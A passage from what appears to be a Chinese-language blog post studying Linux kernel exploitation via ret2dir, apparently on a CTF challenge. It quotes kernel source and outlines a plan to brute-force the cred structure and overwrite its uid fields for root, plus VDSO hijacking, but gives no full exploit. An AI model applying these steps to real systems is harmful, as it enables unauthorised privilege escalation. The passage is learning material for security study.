class="keyword">int</span> preempt_count;		<span class="comment">/* 0=premptable, &lt;0=BUG; will also serve as bh-counter */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_VIRT_CPU_ACCOUNTING_NATIVE</span></span><br><span class="line">	__u64 ac_stamp;</span><br><span class="line">	__u64 ac_leave;</span><br><span class="line">	__u64 ac_stime;</span><br><span class="line">	__u64 ac_utime;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>前面提到要覆写cred结构体，首先需要找到这个结构体的地址。参考的文章里用到了task_struct的一个成员char comm[TASK_COMM_LEN]，根据注释我们也能看出这个变量用来保存可执行文件的名称，利用prctl函数中的option PR_SET_NAME可以对comm进行赋值，长度小于16字节。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://man7.org/linux/man-pages/man2/prctl.2.html</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,<span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</span><br><span class="line"></span><br><span class="line">PR_SET_NAME (since Linux <span class="number">2.6</span><span class="number">.9</span>)</span><br><span class="line">              Set the name of the calling thread, <span class="keyword">using</span> the value in the</span><br><span class="line">              location pointed to by (char *) arg2.  The name can be up to</span><br><span class="line">              <span class="number">16</span> bytes <span class="keyword">long</span>, including the terminating null byte.  (If the</span><br><span class="line">              length of the <span class="built_in">string</span>, including the terminating null byte,</span><br><span class="line">              exceeds <span class="number">16</span> bytes, the <span class="built_in">string</span> is silently truncated.)  This is</span><br><span class="line">              <span class="function">the same attribute that can be <span class="built_in">set</span> via <span class="title">pthread_setname_np</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line">              and retrieved using pthread_getname_np(3).  The attribute is</span><br><span class="line">              likewise accessible via /proc/self/task/[tid]/comm, where tid</span><br><span class="line">              is the name of the calling thread.</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/ident/TASK_COMM_LEN</span></span><br><span class="line"><span class="comment">/* Task command name length */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_COMM_LEN 16</span></span><br></pre></td></tr></table></figure></p>
<h3 id="爆破cred地址"><a href="#爆破cred地址" class="headerlink" title="爆破cred地址"></a>爆破cred地址</h3><p>那我们定位的方法就可以是先利用prctl函数给comm赋值为一个特殊的字符串，然后利用内存任意读去找到该字符串位置，它的前8个字节处就存储了cred的地址。但是64位可寻址空间高达256TB（低48位寻址），如果一个个找下来肯定很浪费时间，可以利用Linux 64位内存布局和task_struct的创建方式来大致确定范围。这里涉及到了进程的创建，与进程创建涉及到三个函数，clone()、fork()和vfork()。在Linux中轻量级进程由名为clone()的函数创建；fork()在Linux中也是用clone()来实现的，fork()创建的子进程与父进程暂时共享一个用户态堆栈，但是只要父进程或子进程中有一个试图去改变堆栈，写时复制技术会为父子进程创建各自用户态堆栈的一份拷贝。vfork()创建的子进程共享父进程的内存地址空间。do_fork()函数负责处理这三个创建进程相关的函数，在执行过程中会调用copy_process()函数，这个函数创建进程描述符以及子进程执行时所需要的其他所有数据结构，该函数在执行过程中会dup_task_struct()为子进程获取进程描述符，该函数通过调用alloc_task_struct_node()，最终kmem_cache_alloc_node()分子进程分配进程描述符。因此task_struct会在动态分配区域。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/fork.c#L336</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_struct *<span class="title">dup_task_struct</span><span class="params">(struct task_struct *orig, <span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> *<span class="title">ti</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">		node = tsk_fork_get_node(orig);</span><br><span class="line">	tsk = alloc_task_struct_node(node);  <span class="comment">//为子进程获取进程描述符</span></span><br><span class="line">	<span class="keyword">if</span> (!tsk)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	ti = alloc_thread_info_node(tsk, node);</span><br><span class="line">	<span class="keyword">if</span> (!ti)</span><br><span class="line">		<span class="keyword">goto</span> free_tsk;</span><br><span class="line"></span><br><span class="line">	err = arch_dup_task_struct(tsk, orig);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> free_ti;</span><br><span class="line"></span><br><span class="line">	tsk-&gt;<span class="built_in">stack</span> = ti;</span><br><span class="line"></span><br><span class="line">	err = kaiser_map_thread_stack(tsk-&gt;<span class="built_in">stack</span>);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> free_ti;</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">	tsk-&gt;splice_pipe = <span class="literal">NULL</span>;</span><br><span class="line">	tsk-&gt;task_frag.page = <span class="literal">NULL</span>;</span><br><span class="line">	tsk-&gt;wake_q.next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	account_kernel_stack(ti, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> tsk;</span><br><span class="line"></span><br><span class="line">free_ti:</span><br><span class="line">	free_thread_info(ti);</span><br><span class="line">free_tsk:</span><br><span class="line">	free_task_struct(tsk);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/fork.c#L140</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct task_struct *<span class="title">alloc_task_struct_node</span><span class="params">(<span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>根据Linux x86_64内存分布图可以确定寻找comm的地址范围在0xffff880000000000~0xffffc80000000000直接映射内存区。图上大小标注错了，应该是64T。<br><img src="/2019/10/10/ret2dir利用学习/4.png" alt="4"></p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>所以总结利用过程就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. shrink size获得内存任意读写</span><br><span class="line">2. 利用prctl(PR_SET_NAME)修改comm为一特殊字符串。</span><br><span class="line">3. 爆破comm的位置，从而获得cred结构体所在位置。</span><br><span class="line">4. 覆写cred结构体的uid~fgid字段，执行system(&quot;/bin/sh&quot;)提权。</span><br></pre></td></tr></table></figure></p>
<p>exp我就不贴了，仅仅记录我在学习过程中遇到的问题。</p>
<h2 id="利用方法二-劫持VDSO"><a href="#利用方法二-劫持VDSO" class="headerlink" title="利用方法二 劫持VDSO"></a>利用方法二 劫持VDSO</h2><h3 id="VDSO"><a href="#VDSO" class="headerlink" title="VDSO"></a>VDSO</h3><p>VDSO（virtual dynamic shared object）是一个小型的内核与用户空间的共享库，内核会自动将其映射到处于所有用户空间的对象的地址空间中，这样用户程序可以像调用其它库函数一样调用vdso里面的函数。之所以存在这样一个内核与用户之间的共享库，是因为有一些系统调用会被频繁调用，如果像传统那样先准备好参数，然后从用户态切换到内核态，比如32位系统就是int 80触发软件中断进入内核，上下文切换开销太大，而且有一些系统调用对时间要求很高。通过glibc，所有用户空间的应用程序与该共享库进行链接。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ ldd /bin/sh</span><br><span class="line">    linux-vdso.so.1 =&gt;  (0x00007ffff7ffd000)</span><br><span class="line">    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79fd000)</span><br><span class="line">    /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)</span><br></pre></td></tr></table></figure></p>
<p>vdso的初始化在init_vdso函数中，这个函数针对32位和64位的vdso image进行初始化，具体取决于CONFIG_X86_X32_ABI这个内核配置参数。这个参数决定了调用系统调用的方式，比如x86中使用int 80，x86_64中使用syscall。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/arch/x86/entry/vdso/vma.c#L286</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">init_vdso</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	init_vdso_image(&amp;vdso_image_64);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_X32_ABI</span></span><br><span class="line">	init_vdso_image(&amp;vdso_image_x32);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	cpu_notifier_register_begin();</span><br><span class="line"></span><br><span class="line">	on_each_cpu(vgetcpu_cpu_init, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="comment">/* notifier priority &gt; KVM */</span></span><br><span class="line">	__hotcpu_notifier(vgetcpu_cpu_notifier, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">	cpu_notifier_register_done();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/arch/x86/include/asm/vdso.h#L12</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vdso_image</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> *data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> size;   <span class="comment">/* Always a multiple of PAGE_SIZE */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* text_mapping.pages is big enough for data/size page pointers */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_special_mapping</span> <span class="title">text_mapping</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> alt, alt_len;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">long</span> sym_vvar_start;  <span class="comment">/* Negative offset to the vvar area */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">long</span> sym_vvar_page;</span><br><span class="line">	<span class="keyword">long</span> sym_hpet_page;</span><br><span class="line">	<span class="keyword">long</span> sym_pvclock_page;</span><br><span class="line">	<span class="keyword">long</span> sym_VDSO32_NOTE_MASK;</span><br><span class="line">	<span class="keyword">long</span> sym___kernel_sigreturn;</span><br><span class="line">	<span class="keyword">long</span> sym___kernel_rt_sigreturn;</span><br><span class="line">	<span class="keyword">long</span> sym___kernel_vsyscall;</span><br><span class="line">	<span class="keyword">long</span> sym_int80_landing_pad;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vdso_image</span> <span class="title">vdso_image_64</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_X32</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vdso_image</span> <span class="title">vdso_image_x32</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_X86_32 || defined CONFIG_COMPAT</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vdso_image</span> <span class="title">vdso_image_32</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p>
<p>函数init_vdso_image用来初始化与vdso相关的内存页面的页面结构：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/arch/x86/entry/vdso/vma.c#L27</span></span><br><span class="line"><span class="keyword">void</span> __<span class="function">init <span class="title">init_vdso_image</span><span class="params">(<span class="keyword">const</span> struct vdso_image *image)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> npages = (image-&gt;size) / PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">	BUG_ON(image-&gt;size % PAGE_SIZE != <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; npages; i++)</span><br><span class="line">		image-&gt;text_mapping.pages[i] =</span><br><span class="line">			virt_to_page(image-&gt;data + i*PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">	apply_alternatives((struct alt_instr *)(image-&gt;data + image-&gt;alt),</span><br><span class="line">			   (struct alt_instr *)(image-&gt;data + image-&gt;alt +</span><br><span class="line">						image-&gt;alt_len));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当初始化完成之后，接下来进行vdso所在页面的映射，当二进制文件加载到内存时，它们是由内核进行映射的，以x86_64为例，arch_setup_additional_pages函数首先检查是否启用了vdso，然后调用map_vdso进行映射。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/arch/x86/entry/vdso/vma.c#L204</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">arch_setup_additional_pages</span><span class="params">(struct linux_binprm *bprm, <span class="keyword">int</span> uses_interp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!vdso64_enabled)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> map_vdso(&amp;vdso_image_64, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>map_vdso函数中调用remap_pfn_range函数将内核空间的内存映射到用户空间。页面的权限是VM_READ|VM_EXEC|VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/arch/x86/entry/vdso/vma.c#L92</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_vdso</span><span class="params">(<span class="keyword">const</span> struct vdso_image *image, <span class="keyword">bool</span> calculate_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">current</span>-&gt;<span class="title">mm</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, text_start;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">no_pages</span>[] = &#123;</span><span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_special_mapping</span> <span class="title">vvar_mapping</span> = &#123;</span></span><br><span class="line">		.name = <span class="string">"[vvar]"</span>,</span><br><span class="line">		.pages = no_pages,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pvclock_vsyscall_time_info</span> *<span class="title">pvti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (calculate_addr) &#123;</span><br><span class="line">		addr = vdso_addr(current-&gt;mm-&gt;start_stack,</span><br><span class="line">				 image-&gt;size - image-&gt;sym_vvar_start);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		addr = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	down_write(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">	addr = get_unmapped_area(<span class="literal">NULL</span>, addr,</span><br><span class="line">				 image-&gt;size - image-&gt;sym_vvar_start, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR_VALUE(addr)) &#123;</span><br><span class="line">		ret = addr;</span><br><span class="line">		<span class="keyword">goto</span> up_fail;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	text_start = addr - image-&gt;sym_vvar_start;</span><br><span class="line">	current-&gt;mm-&gt;context.vdso = (<span class="keyword">void</span> __user *)text_start;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * MAYWRITE to allow gdb to COW and set breakpoints</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	vma = _install_special_mapping(mm,</span><br><span class="line">				       text_start,</span><br><span class="line">				       image-&gt;size,</span><br><span class="line">				       VM_READ|VM_EXEC|</span><br><span class="line">				       VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC,</span><br><span class="line">				       &amp;image-&gt;text_mapping);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(vma)) &#123;</span><br><span class="line">		ret = PTR_ERR(vma);</span><br><span class="line">		<span class="keyword">goto</span> up_fail;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vma = _install_special_mapping(mm,</span><br><span class="line">				       addr,</span><br><span class="line">				       -image-&gt;sym_vvar_start,</span><br><span class="line">				       VM_READ|VM_MAYREAD,</span><br><span class="line">				       &amp;vvar_mapping);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(vma)) &#123;</span><br><span class="line">		ret = PTR_ERR(vma);</span><br><span class="line">		<span class="keyword">goto</span> up_fail;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (image-&gt;sym_vvar_page)</span><br><span class="line">		ret = remap_pfn_range(vma,</span><br><span class="line">				      text_start + image-&gt;sym_vvar_page,</span><br><span class="line">				      __pa_symbol(&amp;__vvar_page) &gt;&gt; PAGE_SHIFT,</span><br><span class="line">				      PAGE_SIZE,</span><br><span class="line">				      PAGE_READONLY);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> up_fail;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HPET_TIMER</span></span><br><span class="line">	<span class="keyword">if</span> (hpet_address &amp;&amp; image-&gt;sym_hpet_page) &#123;</span><br><span class="line">		ret = io_remap_pfn_range(vma,</span><br><span class="line">			text_start + image-&gt;sym_hpet_page,</span><br><span class="line">			hpet_address &gt;&gt; PAGE_SHIFT,</span><br><span class="line">			PAGE_SIZE,</span><br><span class="line">			pgprot_noncached(PAGE_READONLY));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">goto</span> up_fail;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	pvti = pvclock_pvti_cpu0_va();</span><br><span class="line">	<span class="keyword">if</span> (pvti &amp;&amp; image-&gt;sym_pvclock_page) &#123;</span><br><span class="line">		ret = remap_pfn_range(vma,</span><br><span class="line">				      text_start + image-&gt;sym_pvclock_page,</span><br><span class="line">				      __pa(pvti) &gt;&gt; PAGE_SHIFT,</span><br><span class="line">				      PAGE_SIZE,</span><br><span class="line">				      PAGE_READONLY);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">goto</span> up_fail;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">up_fail:</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		current-&gt;mm-&gt;context.vdso = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	up_write(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>vdso在内核态的权限是RW，在用户态的权限是RX，用户态查看如下所示，首先要关闭内核的地址随机化，再去查看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ sudo sysctl -w kernel.randomize_va_space=0[sudo] password for ubuntu: </span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ cat /proc/self/maps</span><br><span class="line">00400000-0040b000 r-xp 00000000 08:01 1048639                            /bin/cat</span><br><span class="line">0060a000-0060b000 r--p 0000a000 08:01 1048639                            /bin/cat</span><br><span class="line">0060b000-0060c000 rw-p 0000b000 08:01 1048639                            /bin/cat</span><br><span class="line">0060c000-0062d000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7ffff732f000-7ffff7a11000 r--p 00000000 08:01 1580912                    /usr/lib/locale/locale-archive</span><br><span class="line">7ffff7a11000-7ffff7bcf000 r-xp 00000000 08:01 3276900                    /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">7ffff7bcf000-7ffff7dcf000 ---p 001be000 08:01 3276900                    /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">7ffff7dcf000-7ffff7dd3000 r--p 001be000 08:01 3276900                    /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">7ffff7dd3000-7ffff7dd5000 rw-p 001c2000 08:01 3276900                    /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">7ffff7dd5000-7ffff7dda000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7dda000-7ffff7dfd000 r-xp 00000000 08:01 3276897                    /lib/x86_64-linux-gnu/ld-2.19.so</span><br><span class="line">7ffff7fe1000-7ffff7fe4000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7ffc000-7ffff7ffd000 r--p 00022000 08:01 3276897                    /lib/x86_64-linux-gnu/ld-2.19.so</span><br><span 